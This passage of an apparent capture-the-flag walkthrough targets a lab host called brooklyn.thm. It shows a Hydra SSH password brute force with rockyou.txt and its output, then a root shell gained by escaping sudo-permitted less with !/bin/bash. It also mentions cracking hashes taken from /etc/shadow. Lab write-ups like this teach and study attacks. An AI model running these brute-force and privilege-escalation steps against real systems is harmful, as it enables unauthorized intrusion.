Exploitation

Based on the message found in note_to_jake.txt, Jake is using a weak password. This makes a brute-force attack a reasonable next step.

We know a user named jake exists, so we attempt an SSH login using this account. The rockyou.txt wordlist is commonly used in CTF environments because it contains many real-world leaked passwords, making it effective against weak credentials.

Hydra

> hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://brooklyn.thm

[22][ssh] host: brooklyn.thm   login: jake   password: ******321
1 of 1 target successfully completed, 1 valid password found

The password was cracked in about 2 seconds.

Now we can log in via SSH.

> ssh jake@brooklyn.thm

Privilege Escalation

A common first step after gaining user access is running sudo -l to identify commands that can be executed with elevated privileges.

jake@brookly_nine_nine:/home/holt$ sudo -l
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less

We are allowed to run /usr/bin/less with sudo privileges.

There are different options how to gain root as shell from there, but I like to use GTFObins

We execute the following command: sudo less /etc/profile > jake@brookly_nine_nine:/home/holt$ sudo less /etc/profile

After opening the file, type: !/bin/bash and hit enter. You should now see the # symbol, which indicates that we have obtained root privileges. You can also confirm this by running the whoami command.

root@brookly_nine_nine:/home/holt# whoami
root

There are also other possible techniques. For example, you could copy /etc/passwd and /etc/shadow, extract the password hashes ReadMore, and attempt to crack them. A useful online tool for this is crackstation. After cracking the hash, you could log in as root over SSH using the recovered password.
